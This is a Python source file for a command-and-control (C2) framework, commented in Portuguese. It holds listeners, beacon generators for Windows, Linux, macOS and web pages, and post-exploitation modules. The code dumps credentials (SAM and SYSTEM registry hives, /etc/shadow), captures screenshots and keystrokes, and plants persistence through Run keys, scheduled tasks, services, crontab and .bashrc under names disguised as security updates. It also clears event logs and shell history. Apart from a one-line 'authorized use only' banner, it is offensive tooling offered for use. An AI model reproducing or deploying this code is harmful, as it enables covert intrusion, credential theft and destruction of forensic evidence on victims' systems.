#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 C2 FRAMEWORK - COMMAND & CONTROL 🎯
Framework de comando e controle pós-exploração
Sistema completo de beacons, listeners e post-exploitation

⚠️  ATENÇÃO: USE APENAS EM AMBIENTES AUTORIZADOS ⚠️
"""

import socket
import threading
import time
import json
import base64
import hashlib
import hmac
import random
import string
import subprocess
import os
import sys
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from urllib.parse import urlparse
import requests
import struct
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import ssl

@dataclass
class Beacon:
    """Beacon implantado no alvo"""
    beacon_id: str
    target_ip: str
    target_hostname: str
    operating_system: str
    architecture: str
    user_context: str
    privileges: str
    install_path: str
    last_checkin: float
    callback_interval: int
    communication_method: str
    encryption_key: str
    status: str = "active"  # active, inactive, dead
    capabilities: List[str] = field(default_factory=list)
    
@dataclass
class Listener:
    """Listener para receber conexões"""
    listener_id: str
    listen_address: str
    listen_port: int
    protocol: str
    encryption_enabled: bool
    ssl_cert: Optional[str] = None
    ssl_key: Optional[str] = None
    status: str = "stopped"
    active_beacons: List[str] = field(default_factory=list)

@dataclass
class Task:
    """Tarefa para execução no beacon"""
    task_id: str
    beacon_id: str
    command: str
    arguments: Dict[str, Any]
    status: str = "pending"  # pending, sent, completed, failed
    created_at: float = field(default_factory=time.time)
    result: Optional[str] = None
    error: Optional[str] = None

@dataclass
class PostExploitationModule:
    """Módulo de pós-exploração"""
    module_name: str
    description: str
    required_privileges: str
    target_os: List[str]
    execute_function: Callable
    cleanup_function: Optional[Callable] = None

class C2Framework:
    """
    🎯 Framework de Comando e Controle
    
    Funcionalidades:
    - Múltiplos listeners (HTTP/HTTPS/TCP/DNS)
    - Beacons criptografados
    - Comunicação stealth
    - Módulos de pós-exploração
    - Lateral movement automático
    - Persistence mechanisms
    - Anti-forensics
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        self.listeners = {}  # listener_id -> Listener
        self.beacons = {}    # beacon_id -> Beacon
        self.tasks = {}      # task_id -> Task
        self.active_sessions = {}
        
        # Configuração de criptografia
        self.master_key = self._generate_master_key()
        self.encryption_suite = Fernet(self.master_key)
        
        # Módulos de pós-exploração
        self.post_exploit_modules = self._initialize_post_exploit_modules()
        
        # Configurações de comunicação (serão implementadas conforme necessário)
        self.communication_protocols = {
            "http": "http_protocol",
            "https": "https_protocol", 
            "tcp": "tcp_protocol",
            "dns": "dns_protocol"
        }
        
        # Templates de beacons
        self.beacon_templates = {
            "windows": self._windows_beacon_template,
            "linux": self._linux_beacon_template,
            "macos": self._macos_beacon_template,
            "web": self._web_beacon_template
        }
        
        # User-Agents para camuflagem
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

    def create_listener(self, protocol: str, address: str, port: int, 
                       ssl_cert: str = None, ssl_key: str = None) -> str:
        """Cria um novo listener"""
        listener_id = self._generate_id()
        
        listener = Listener(
            listener_id=listener_id,
            listen_address=address,
            listen_port=port,
            protocol=protocol,
            encryption_enabled=True,
            ssl_cert=ssl_cert,
            ssl_key=ssl_key
        )
        
        self.listeners[listener_id] = listener
        
        if self.logger:
            self.logger.info(f"🎯 Listener criado: {protocol}://{address}:{port}")
        
        return listener_id

    def start_listener(self, listener_id: str) -> bool:
        """Inicia um listener"""
        if listener_id not in self.listeners:
            return False
        
        listener = self.listeners[listener_id]
        
        try:
            # Iniciar thread do listener baseado no protocolo
            if listener.protocol in ["http", "https"]:
                thread = threading.Thread(
                    target=self._http_listener_thread,
                    args=(listener,),
                    daemon=True
                )
            elif listener.protocol == "tcp":
                thread = threading.Thread(
                    target=self._tcp_listener_thread,
                    args=(listener,),
                    daemon=True
                )
            elif listener.protocol == "dns":
                thread = threading.Thread(
                    target=self._dns_listener_thread,
                    args=(listener,),
                    daemon=True
                )
            else:
                return False
            
            thread.start()
            listener.status = "running"
            
            if self.logger:
                self.logger.success(f"🎯 Listener {listener_id} iniciado em {listener.listen_address}:{listener.listen_port}")
            
            return True
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"Erro ao iniciar listener: {e}")
            return False

    def generate_beacon(self, target_os: str, listener_id: str, 
                       communication_method: str = "http") -> str:
        """Gera payload de beacon para o alvo"""
        if listener_id not in self.listeners:
            raise ValueError("Listener não encontrado")
        
        listener = self.listeners[listener_id]
        beacon_id = self._generate_id()
        
        # Configuração do beacon
        beacon_config = {
            "beacon_id": beacon_id,
            "c2_server": f"{listener.listen_address}:{listener.listen_port}",
            "protocol": communication_method,
            "encryption_key": base64.b64encode(self.master_key).decode(),
            "callback_interval": random.randint(30, 120),  # Jitter
            "user_agent": random.choice(self.user_agents)
        }
        
        # Gerar payload baseado no OS
        if target_os in self.beacon_templates:
            payload = self.beacon_templates[target_os](beacon_config)
        else:
            payload = self.beacon_templates["linux"](beacon_config)  # Default
        
        if self.logger:
            self.logger.info(f"🎯 Beacon gerado para {target_os}: {beacon_id}")
        
        return payload

    def register_beacon(self, beacon_info: Dict[str, Any]) -> str:
        """Registra um novo beacon que se conectou"""
        beacon_id = beacon_info.get("beacon_id", self._generate_id())
        
        beacon = Beacon(
            beacon_id=beacon_id,
            target_ip=beacon_info.get("ip", "unknown"),
            target_hostname=beacon_info.get("hostname", "unknown"),
            operating_system=beacon_info.get("os", "unknown"),
            architecture=beacon_info.get("arch", "unknown"),
            user_context=beacon_info.get("user", "unknown"),
            privileges=beacon_info.get("privileges", "user"),
            install_path=beacon_info.get("path", "unknown"),
            last_checkin=time.time(),
            callback_interval=beacon_info.get("interval", 60),
            communication_method=beacon_info.get("method", "http"),
            encryption_key=beacon_info.get("key", ""),
            capabilities=beacon_info.get("capabilities", [])
        )
        
        self.beacons[beacon_id] = beacon
        
        if self.logger:
            self.logger.critical(f"🎯 BEACON REGISTRADO: {beacon.target_hostname} ({beacon.target_ip})")
            self.logger.info(f"   OS: {beacon.operating_system}")
            self.logger.info(f"   Usuário: {beacon.user_context}")
            self.logger.info(f"   Privilégios: {beacon.privileges}")
        
        return beacon_id

    def send_command(self, beacon_id: str, command: str, arguments: Dict[str, Any] = None) -> str:
        """Envia comando para um beacon"""
        if beacon_id not in self.beacons:
            raise ValueError("Beacon não encontrado")
        
        task_id = self._generate_id()
        task = Task(
            task_id=task_id,
            beacon_id=beacon_id,
            command=command,
            arguments=arguments or {}
        )
        
        self.tasks[task_id] = task
        
        if self.logger:
            self.logger.info(f"🎯 Comando enviado para {beacon_id}: {command}")
        
        return task_id

    def execute_post_exploitation(self, beacon_id: str, module_name: str, 
                                 parameters: Dict[str, Any] = None) -> str:
        """Executa módulo de pós-exploração"""
        if beacon_id not in self.beacons:
            raise ValueError("Beacon não encontrado")
        
        if module_name not in self.post_exploit_modules:
            raise ValueError("Módulo não encontrado")
        
        beacon = self.beacons[beacon_id]
        module = self.post_exploit_modules[module_name]
        
        # Verificar privilégios necessários
        if module.required_privileges == "admin" and beacon.privileges != "admin":
            if self.logger:
                self.logger.warning(f"Módulo {module_name} requer privilégios administrativos")
        
        # Verificar OS compatível
        if beacon.operating_system not in module.target_os and "all" not in module.target_os:
            raise ValueError(f"Módulo não compatível com {beacon.operating_system}")
        
        # Executar módulo
        try:
            result = module.execute_function(beacon, parameters or {})
            
            if self.logger:
                self.logger.success(f"🎯 Módulo {module_name} executado com sucesso em {beacon_id}")
            
            return result
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"Erro ao executar módulo {module_name}: {e}")
            raise

    def lateral_movement_scan(self, beacon_id: str) -> List[Dict[str, Any]]:
        """Scan automático para movimento lateral"""
        if beacon_id not in self.beacons:
            raise ValueError("Beacon não encontrado")
        
        beacon = self.beacons[beacon_id]
        
        # Comandos de descoberta baseados no OS
        if "windows" in beacon.operating_system.lower():
            discovery_commands = [
                "net view",
                "arp -a",
                "ipconfig /all",
                "nltest /domain_trusts",
                "net group \"Domain Computers\" /domain",
                "wmic computersystem get domain"
            ]
        else:  # Linux/Unix
            discovery_commands = [
                "arp -a",
                "netstat -rn",
                "cat /etc/hosts",
                "ps aux | grep ssh",
                "mount | grep nfs"
            ]
        
        discoveries = []
        
        for cmd in discovery_commands:
            task_id = self.send_command(beacon_id, "shell", {"command": cmd})
            # Em implementação real, aguardaria resultado
            discoveries.append({
                "command": cmd,
                "task_id": task_id,
                "status": "pending"
            })
        
        if self.logger:
            self.logger.info(f"🔗 Scan de movimento lateral iniciado em {beacon_id}")
        
        return discoveries

    def establish_persistence(self, beacon_id: str, method: str = "auto") -> bool:
        """Estabelece persistência no sistema alvo"""
        if beacon_id not in self.beacons:
            return False
        
        beacon = self.beacons[beacon_id]
        
        # Métodos de persistência baseados no OS
        if "windows" in beacon.operating_system.lower():
            persistence_methods = {
                "registry": self._windows_registry_persistence,
                "scheduled_task": self._windows_scheduled_task_persistence,
                "service": self._windows_service_persistence,
                "startup": self._windows_startup_persistence
            }
        else:  # Linux/Unix
            persistence_methods = {
                "crontab": self._linux_crontab_persistence,
                "systemd": self._linux_systemd_persistence,
                "bashrc": self._linux_bashrc_persistence,
                "init": self._linux_init_persistence
            }
        
        if method == "auto":
            # Escolher método baseado em privilégios
            if beacon.privileges == "admin":
                method = "service" if "windows" in beacon.operating_system.lower() else "systemd"
            else:
                method = "registry" if "windows" in beacon.operating_system.lower() else "crontab"
        
        if method in persistence_methods:
            try:
                result = persistence_methods[method](beacon)
                
                if self.logger:
                    self.logger.success(f"🔒 Persistência estabelecida: {method} em {beacon_id}")
                
                return result
            except Exception as e:
                if self.logger:
                    self.logger.error(f"Erro ao estabelecer persistência: {e}")
                return False
        
        return False

    def cleanup_beacon(self, beacon_id: str) -> bool:
        """Remove rastros do beacon"""
        if beacon_id not in self.beacons:
            return False
        
        beacon = self.beacons[beacon_id]
        
        # Comandos de limpeza
        cleanup_commands = []
        
        if "windows" in beacon.operating_system.lower():
            cleanup_commands = [
                "del /f /q %TEMP%\\*",
                "wevtutil cl Security",
                "wevtutil cl System",
                "wevtutil cl Application"
            ]
        else:  # Linux/Unix
            cleanup_commands = [
                "history -c",
                "rm -rf /tmp/*",
                "rm -f ~/.bash_history",
                "unset HISTFILE"
            ]
        
        for cmd in cleanup_commands:
            self.send_command(beacon_id, "shell", {"command": cmd})
        
        if self.logger:
            self.logger.info(f"🧹 Limpeza iniciada em {beacon_id}")
        
        return True

    def _generate_master_key(self) -> bytes:
        """Gera chave mestra para criptografia"""
        password = "BlackHatC2Framework2024"
        salt = b"c2_framework_salt"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))

    def _generate_id(self) -> str:
        """Gera ID único"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    def _http_listener_thread(self, listener: Listener):
        """Thread do listener HTTP/HTTPS"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        
        class C2HTTPHandler(BaseHTTPRequestHandler):
            def __init__(self, c2_framework, *args, **kwargs):
                self.c2_framework = c2_framework
                super().__init__(*args, **kwargs)
            
            def do_GET(self):
                # Handle beacon check-in
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"OK")
            
            def do_POST(self):
                # Handle task results
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                
                try:
                    # Decrypt and process beacon data
                    decrypted_data = self.c2_framework.encryption_suite.decrypt(post_data)
                    beacon_data = json.loads(decrypted_data)
                    
                    # Process beacon registration or task result
                    if "beacon_info" in beacon_data:
                        self.c2_framework.register_beacon(beacon_data["beacon_info"])
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(b'{"status": "ok"}')
                    
                except Exception as e:
                    self.send_response(400)
                    self.end_headers()
        
        # Criar handler com referência ao framework
        handler = lambda *args, **kwargs: C2HTTPHandler(self, *args, **kwargs)
        
        try:
            server = HTTPServer((listener.listen_address, listener.listen_port), handler)
            
            if listener.protocol == "https":
                # Configurar SSL
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                if listener.ssl_cert and listener.ssl_key:
                    context.load_cert_chain(listener.ssl_cert, listener.ssl_key)
                server.socket = context.wrap_socket(server.socket, server_side=True)
            
            server.serve_forever()
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"Erro no listener HTTP: {e}")

    def _tcp_listener_thread(self, listener: Listener):
        """Thread do listener TCP"""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((listener.listen_address, listener.listen_port))
            server_socket.listen(5)
            
            if self.logger:
                self.logger.info(f"TCP Listener rodando em {listener.listen_address}:{listener.listen_port}")
            
            while True:
                client_socket, address = server_socket.accept()
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self._handle_tcp_client,
                    args=(client_socket, address, listener),
                    daemon=True
                )
                client_thread.start()
                
        except Exception as e:
            if self.logger:
                self.logger.error(f"Erro no listener TCP: {e}")

    def _dns_listener_thread(self, listener: Listener):
        """Thread do listener DNS"""
        # Implementação simplificada do listener DNS
        # Em produção, usaria biblioteca como dnslib
        if self.logger:
            self.logger.info(f"DNS Listener simulado em {listener.listen_address}:{listener.listen_port}")

    def _handle_tcp_client(self, client_socket: socket.socket, address: tuple, listener: Listener):
        """Manipula cliente TCP"""
        try:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                # Decrypt and process data
                try:
                    decrypted_data = self.encryption_suite.decrypt(data)
                    message = json.loads(decrypted_data)
                    
                    # Process message
                    if "beacon_info" in message:
                        beacon_id = self.register_beacon(message["beacon_info"])
                        listener.active_beacons.append(beacon_id)
                    
                    # Send response
                    response = json.dumps({"status": "ok"}).encode()
                    encrypted_response = self.encryption_suite.encrypt(response)
                    client_socket.send(encrypted_response)
                    
                except Exception as e:
                    if self.logger:
                        self.logger.debug(f"Erro ao processar dados TCP: {e}")
                    break
                
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Erro na conexão TCP: {e}")
        finally:
            client_socket.close()

    def _initialize_post_exploit_modules(self) -> Dict[str, PostExploitationModule]:
        """Inicializa módulos de pós-exploração"""
        modules = {}
        
        # Módulo de coleta de informações
        modules["gather_info"] = PostExploitationModule(
            module_name="gather_info",
            description="Coleta informações do sistema",
            required_privileges="user",
            target_os=["windows", "linux", "macos"],
            execute_function=self._gather_system_info
        )
        
        # Módulo de dump de credenciais
        modules["dump_credentials"] = PostExploitationModule(
            module_name="dump_credentials",
            description="Extrai credenciais do sistema",
            required_privileges="admin",
            target_os=["windows", "linux"],
            execute_function=self._dump_credentials
        )
        
        # Módulo de captura de tela
        modules["screenshot"] = PostExploitationModule(
            module_name="screenshot",
            description="Captura tela do usuário",
            required_privileges="user",
            target_os=["windows", "linux", "macos"],
            execute_function=self._take_screenshot
        )
        
        # Módulo de keylogger
        modules["keylogger"] = PostExploitationModule(
            module_name="keylogger",
            description="Captura teclas digitadas",
            required_privileges="user",
            target_os=["windows", "linux", "macos"],
            execute_function=self._start_keylogger
        )
        
        return modules

    def _gather_system_info(self, beacon: Beacon, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Coleta informações do sistema"""
        # Em implementação real, executaria comandos no beacon
        info = {
            "hostname": beacon.target_hostname,
            "ip": beacon.target_ip,
            "os": beacon.operating_system,
            "user": beacon.user_context,
            "privileges": beacon.privileges
        }
        
        # Comandos específicos baseados no OS
        if "windows" in beacon.operating_system.lower():
            commands = [
                "systeminfo",
                "whoami /all",
                "net user",
                "wmic qfe list"
            ]
        else:
            commands = [
                "uname -a",
                "id",
                "ps aux",
                "netstat -tlnp"
            ]
        
        for cmd in commands:
            task_id = self.send_command(beacon.beacon_id, "shell", {"command": cmd})
            info[f"task_{cmd[:10]}"] = task_id
        
        return info

    def _dump_credentials(self, beacon: Beacon, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Extrai credenciais do sistema"""
        result = {"method": "credential_dump", "success": False}
        
        if "windows" in beacon.operating_system.lower():
            # Windows credential dumping
            commands = [
                "reg save hklm\\sam sam.save",
                "reg save hklm\\security security.save", 
                "reg save hklm\\system system.save"
            ]
        else:
            # Linux credential dumping
            commands = [
                "cat /etc/passwd",
                "cat /etc/shadow",
                "cat /etc/group"
            ]
        
        for cmd in commands:
            task_id = self.send_command(beacon.beacon_id, "shell", {"command": cmd})
            result[f"task_{len(result)}"] = task_id
        
        return result

    def _take_screenshot(self, beacon: Beacon, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Captura tela"""
        # Comando para screenshot baseado no OS
        if "windows" in beacon.operating_system.lower():
            command = "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')\""
        elif "linux" in beacon.operating_system.lower():
            command = "import -window root screenshot.png"
        else:  # macOS
            command = "screencapture -x screenshot.png"
        
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        
        return {"screenshot_task": task_id, "method": "screenshot"}

    def _start_keylogger(self, beacon: Beacon, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Inicia keylogger"""
        # Implementação simplificada
        task_id = self.send_command(beacon.beacon_id, "keylog", {"duration": parameters.get("duration", 3600)})
        
        return {"keylogger_task": task_id, "duration": parameters.get("duration", 3600)}

    def _windows_beacon_template(self, config: Dict[str, Any]) -> str:
        """Template de beacon para Windows"""
        beacon_code = f'''
import requests
import time
import json
import base64
import os
import subprocess
from cryptography.fernet import Fernet

class WindowsBeacon:
    def __init__(self):
        self.beacon_id = "{config['beacon_id']}"
        self.c2_server = "{config['c2_server']}"
        self.protocol = "{config['protocol']}"
        self.encryption_key = "{config['encryption_key']}"
        self.callback_interval = {config['callback_interval']}
        self.user_agent = "{config['user_agent']}"
        
    def register(self):
        info = {{
            "beacon_id": self.beacon_id,
            "hostname": os.getenv("COMPUTERNAME"),
            "ip": self.get_ip(),
            "os": "Windows",
            "arch": os.getenv("PROCESSOR_ARCHITECTURE"),
            "user": os.getenv("USERNAME"),
            "privileges": self.check_privileges(),
            "path": __file__
        }}
        
        self.send_data({{"beacon_info": info}})
    
    def get_ip(self):
        # Get local IP
        return "127.0.0.1"  # Simplified
    
    def check_privileges(self):
        # Check if running as admin
        try:
            import ctypes
            return "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user"
        except:
            return "user"
    
    def send_data(self, data):
        # Send encrypted data to C2
        pass
    
    def main_loop(self):
        self.register()
        while True:
            time.sleep(self.callback_interval)
            # Check for tasks and execute

if __name__ == "__main__":
    beacon = WindowsBeacon()
    beacon.main_loop()
'''
        return beacon_code

    def _linux_beacon_template(self, config: Dict[str, Any]) -> str:
        """Template de beacon para Linux"""
        beacon_code = f'''#!/usr/bin/env python3
import requests
import time
import json
import base64
import os
import subprocess
import socket

class LinuxBeacon:
    def __init__(self):
        self.beacon_id = "{config['beacon_id']}"
        self.c2_server = "{config['c2_server']}"
        self.protocol = "{config['protocol']}"
        self.encryption_key = "{config['encryption_key']}"
        self.callback_interval = {config['callback_interval']}
        
    def register(self):
        info = {{
            "beacon_id": self.beacon_id,
            "hostname": socket.gethostname(),
            "ip": self.get_ip(),
            "os": "Linux",
            "arch": os.uname().machine,
            "user": os.getenv("USER"),
            "privileges": "admin" if os.getuid() == 0 else "user",
            "path": __file__
        }}
        
        self.send_data({{"beacon_info": info}})
    
    def get_ip(self):
        # Get local IP
        return "127.0.0.1"  # Simplified
    
    def send_data(self, data):
        # Send encrypted data to C2
        pass
    
    def main_loop(self):
        self.register()
        while True:
            time.sleep(self.callback_interval)
            # Check for tasks and execute

if __name__ == "__main__":
    beacon = LinuxBeacon()
    beacon.main_loop()
'''
        return beacon_code

    def _macos_beacon_template(self, config: Dict[str, Any]) -> str:
        """Template de beacon para macOS"""
        return self._linux_beacon_template(config)  # Similar ao Linux

    def _web_beacon_template(self, config: Dict[str, Any]) -> str:
        """Template de beacon para aplicações web"""
        beacon_code = f'''
// Web Beacon JavaScript
class WebBeacon {{
    constructor() {{
        this.beaconId = "{config['beacon_id']}";
        this.c2Server = "{config['c2_server']}";
        this.callbackInterval = {config['callback_interval']} * 1000;
    }}
    
    register() {{
        const info = {{
            beacon_id: this.beaconId,
            hostname: window.location.hostname,
            ip: "web_client",
            os: navigator.platform,
            arch: navigator.platform,
            user: "web_user",
            privileges: "user",
            path: window.location.href
        }};
        
        this.sendData({{beacon_info: info}});
    }}
    
    sendData(data) {{
        fetch(`${{this.c2Server}}/beacon`, {{
            method: 'POST',
            body: JSON.stringify(data),
            headers: {{'Content-Type': 'application/json'}}
        }});
    }}
    
    mainLoop() {{
        this.register();
        setInterval(() => {{
            // Check for tasks
        }}, this.callbackInterval);
    }}
}}

const beacon = new WebBeacon();
beacon.mainLoop();
'''
        return beacon_code

    # Métodos de persistência Windows
    def _windows_registry_persistence(self, beacon: Beacon) -> bool:
        """Persistência via registro do Windows"""
        command = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SecurityUpdate" /t REG_SZ /d "beacon.exe"'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    def _windows_scheduled_task_persistence(self, beacon: Beacon) -> bool:
        """Persistência via tarefa agendada"""
        command = 'schtasks /create /tn "SecurityCheck" /tr "beacon.exe" /sc onlogon'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    def _windows_service_persistence(self, beacon: Beacon) -> bool:
        """Persistência via serviço Windows"""
        command = 'sc create "SecurityService" binPath= "beacon.exe" start= auto'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    def _windows_startup_persistence(self, beacon: Beacon) -> bool:
        """Persistência via pasta de inicialização"""
        command = 'copy beacon.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdate.exe"'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    # Métodos de persistência Linux
    def _linux_crontab_persistence(self, beacon: Beacon) -> bool:
        """Persistência via crontab"""
        command = '(crontab -l 2>/dev/null; echo "@reboot /tmp/beacon") | crontab -'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    def _linux_systemd_persistence(self, beacon: Beacon) -> bool:
        """Persistência via systemd"""
        command = 'systemctl --user enable beacon.service'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    def _linux_bashrc_persistence(self, beacon: Beacon) -> bool:
        """Persistência via .bashrc"""
        command = 'echo "/tmp/beacon &" >> ~/.bashrc'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    def _linux_init_persistence(self, beacon: Beacon) -> bool:
        """Persistência via init.d"""
        command = 'cp beacon /etc/init.d/ && update-rc.d beacon defaults'
        task_id = self.send_command(beacon.beacon_id, "shell", {"command": command})
        return True

    def get_active_beacons(self) -> List[Beacon]:
        """Retorna lista de beacons ativos"""
        current_time = time.time()
        active_beacons = []
        
        for beacon in self.beacons.values():
            # Considerar beacon morto se não fez check-in há mais de 5 minutos
            if current_time - beacon.last_checkin < 300:
                active_beacons.append(beacon)
            else:
                beacon.status = "dead"
        
        return active_beacons

    def get_listener_status(self) -> Dict[str, Dict[str, Any]]:
        """Retorna status dos listeners"""
        status = {}
        for listener_id, listener in self.listeners.items():
            status[listener_id] = {
                "protocol": listener.protocol,
                "address": f"{listener.listen_address}:{listener.listen_port}",
                "status": listener.status,
                "active_beacons": len(listener.active_beacons)
            }
        return status